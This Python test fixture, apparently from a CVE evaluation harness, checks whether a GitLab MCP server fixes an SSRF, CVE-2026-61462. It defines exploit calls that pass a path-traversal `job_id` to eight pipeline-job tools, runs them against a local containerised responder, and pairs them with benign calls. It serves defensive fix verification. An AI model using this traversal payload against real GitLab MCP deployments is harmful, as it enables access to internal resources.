"""zereight/gitlab-mcp fix-check fixture: CVE-2026-61462 (SSRF through `job_id`).

The eight pipeline-job tools fetch
`${GITLAB_API_URL}/projects/${project_id}/jobs/${job_id}/...` on the configured GitLab host. On the
vulnerable build (@zereight/mcp-gitlab 2.1.30) the raw `job_id` is interpolated, so a literal-slash
traversal (`../../../../../../internal/secret`) escapes `/jobs/` to an internal path of the same
host: reach = internal_fetch. The patched build (2.1.38) percent-encodes `job_id`
(`encodeGitLabPathSegment`), so the traversal stays one segment.

There is one aimed exploit per counted tool, the six beyond get_pipeline_job_output and
get_job_artifact_file written at assembly, not by a record, from the same traversal. Seven surface
the witness on the vulnerable build: the responder answers it on the traversed `/internal/` path in
the form each tool returns. download_job_artifacts streams that answer to a file whose name the
traversal also escapes, so its response carries no body: it errors on the vulnerable build, the
fetch having passed, and reads the encoded job as not found on the patched one. None surfaces on
the patched build. The benign calls, one per counted tool, use real job ids with no traversal.

The shared singleton responder cannot carry the witness, since check_fix plants a fresh random
nonce per exercise: the builder stands its own responder of the same image with that nonce, on the
backend's bridge, and reaps it when the launch ends. It serves the nonce on any `/internal/` path
and the singleton's answers elsewhere. The server's `GITLAB_API_URL` is
overridden to that responder with a `-e`, which wins over the image's baked `ENV`, while the baked
token and toolsets stay. The responder is not the server and carries neither the flaw nor the fix.
"""

import re
import secrets
import subprocess
import time
from collections.abc import Generator
from contextlib import contextmanager

from evals.cve.backends.gitlab import (
    GITLAB_BRIDGE,
    GITLAB_LAUNCH_LOCK,
    GITLAB_RESPONDER_IMAGE,
    GITLAB_RESPONDER_IP,
    GITLAB_SUBNET,
    ensure_gitlab_responder,
    gitlab_rm,
)
from evals.cve.grammar import FlawClass
from evals.cve.kit.client import KitClient
from evals.cve.kit.fix_check import FixCheckFixture
from evals.cve.kit.launch import Launch, LaunchShape
from evals.cve.places import Coordinates, Place, PlaceKind, Places
from evals.cve.planting import (
    PlantingHost,
    PlantingSpec,
    SymbolicUser,
    confinement_args,
    unprivileged_user_args,
)
from evals.cve.planting_base import LABEL, own_network_args

WITNESS = Place(
    id="gitlab-61462-internal",
    family="fix_check",
    reaches=frozenset({"internal_fetch"}),
    kind=PlaceKind.HTTP_ENDPOINT,
    coordinates=Coordinates(
        PlaceKind.HTTP_ENDPOINT, host=GITLAB_RESPONDER_IP, path="/internal/secret"
    ),
)
# An exploit is aimed when its arguments carry the literal traversal. The benign job id has none,
# and the nonce is in the response, never in the arguments.
AIM = re.compile(r"\.\./")
HOST = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=True)

_TRAVERSAL = "../../../../../../internal/secret"
_SERVER_LAUNCH: list[str] = []
# The singleton sits on the bridge's first address, the per-launch responders above it.
_FIRST_PER_LAUNCH_HOST = 100
_LAST_PER_LAUNCH_HOST = 250


def responder_args(name: str, nonce: str, address: str) -> list[str]:
    return [
        "run", "-d", "--rm",
        "--name", name,
        "--label", LABEL,
        *own_network_args(GITLAB_BRIDGE),
        "--ip", address,
        *confinement_args(),
        "--cap-add", "NET_BIND_SERVICE",
        "-e", f"WITNESS_NONCE={nonce}",
        GITLAB_RESPONDER_IMAGE,
    ]  # fmt: skip


def server_args(image: str, responder_address: str) -> list[str]:
    return [
        "run", "-i", "--rm",
        *confinement_args(),
        *own_network_args(GITLAB_BRIDGE),
        "-e", f"GITLAB_API_URL=http://{responder_address}/api/v4",
        *unprivileged_user_args(),
        "-w", HOST.working_directory,
        image,
        *_SERVER_LAUNCH,
    ]  # fmt: skip


@contextmanager
def gitlab_env(
    image: str, spec: PlantingSpec, shape: LaunchShape = LaunchShape.NORMAL
) -> Generator[Launch]:
    with GITLAB_LAUNCH_LOCK:
        ensure_gitlab_responder()
    name = f"mcp-auditor-kit-gitlab-r-{secrets.token_hex(4)}"
    address = _per_launch_address()
    try:
        subprocess.run(
            ["docker", *responder_args(name, spec.nonces[WITNESS.id], address)],
            check=True,
            capture_output=True,
        )
        time.sleep(1.0)
        yield Launch(command="docker", args=server_args(image, address))
    finally:
        gitlab_rm(name)


def _per_launch_address() -> str:
    network = GITLAB_SUBNET.rsplit(".", 1)[0]
    host = _FIRST_PER_LAUNCH_HOST + secrets.randbelow(
        _LAST_PER_LAUNCH_HOST - _FIRST_PER_LAUNCH_HOST
    )
    return f"{network}.{host}"


async def _exploit_job_output(places: Places, client: KitClient) -> None:
    await client.call_tool("get_pipeline_job_output", {"project_id": "1", "job_id": _TRAVERSAL})


async def _exploit_artifact_file(places: Places, client: KitClient) -> None:
    await client.call_tool(
        "get_job_artifact_file",
        {"project_id": "1", "job_id": _TRAVERSAL, "artifact_path": "x"},
    )


async def _exploit_pipeline_job(places: Places, client: KitClient) -> None:
    await client.call_tool("get_pipeline_job", {"project_id": "1", "job_id": _TRAVERSAL})


async def _exploit_list_artifacts(places: Places, client: KitClient) -> None:
    await client.call_tool("list_job_artifacts", {"project_id": "1", "job_id": _TRAVERSAL})


async def _exploit_download_artifacts(places: Places, client: KitClient) -> None:
    await client.call_tool(
        "download_job_artifacts",
        {"project_id": "1", "job_id": _TRAVERSAL, "local_path": "/tmp"},
    )


async def _exploit_play(places: Places, client: KitClient) -> None:
    await client.call_tool("play_pipeline_job", {"project_id": "1", "job_id": _TRAVERSAL})


async def _exploit_retry(places: Places, client: KitClient) -> None:
    await client.call_tool("retry_pipeline_job", {"project_id": "1", "job_id": _TRAVERSAL})


async def _exploit_cancel(places: Places, client: KitClient) -> None:
    await client.call_tool("cancel_pipeline_job", {"project_id": "1", "job_id": _TRAVERSAL})


async def _benign_job_output(places: Places, client: KitClient) -> None:
    await client.call_tool("get_pipeline_job_output", {"project_id": "1", "job_id": "42"})


async def _benign_artifact_file(places: Places, client: KitClient) -> None:
    await client.call_tool(
        "get_job_artifact_file",
        {
            "project_id": "1",
            "job_id": "42",
            "artifact_path": "other_artifacts_0.1.2/doc_sample.txt",
        },
    )


async def _benign_pipeline_job(places: Places, client: KitClient) -> None:
    await client.call_tool("get_pipeline_job", {"project_id": "1", "job_id": "8"})


async def _benign_list_artifacts(places: Places, client: KitClient) -> None:
    await client.call_tool("list_job_artifacts", {"project_id": "1", "job_id": "42"})


async def _benign_download_artifacts(places: Places, client: KitClient) -> None:
    await client.call_tool(
        "download_job_artifacts",
        {"project_id": "1", "job_id": "42", "local_path": "/tmp"},
    )


async def _benign_play(places: Places, client: KitClient) -> None:
    await client.call_tool("play_pipeline_job", {"project_id": "1", "job_id": "1"})


async def _benign_retry(places: Places, client: KitClient) -> None:
    await client.call_tool("retry_pipeline_job", {"project_id": "1", "job_id": "1"})


async def _benign_cancel(places: Places, client: KitClient) -> None:
    await client.call_tool("cancel_pipeline_job", {"project_id": "1", "job_id": "1"})


FIXTURE = FixCheckFixture(
    flaw="CVE-2026-61462",
    effect_class=FlawClass.INTERNAL_FETCH,
    aim=AIM,
    witness=WITNESS,
    planting_host=HOST,
    builder=gitlab_env,
    exploits=(
        _exploit_job_output,
        _exploit_artifact_file,
        _exploit_pipeline_job,
        _exploit_list_artifacts,
        _exploit_download_artifacts,
        _exploit_play,
        _exploit_retry,
        _exploit_cancel,
    ),
    benign_calls=(
        _benign_job_output,
        _benign_artifact_file,
        _benign_pipeline_job,
        _benign_list_artifacts,
        _benign_download_artifacts,
        _benign_play,
        _benign_retry,
        _benign_cancel,
    ),
    vulnerable_service="gitlab-vuln",
    patched_service="gitlab",
    server_patched_service=None,
)

FIXTURES = (FIXTURE,)
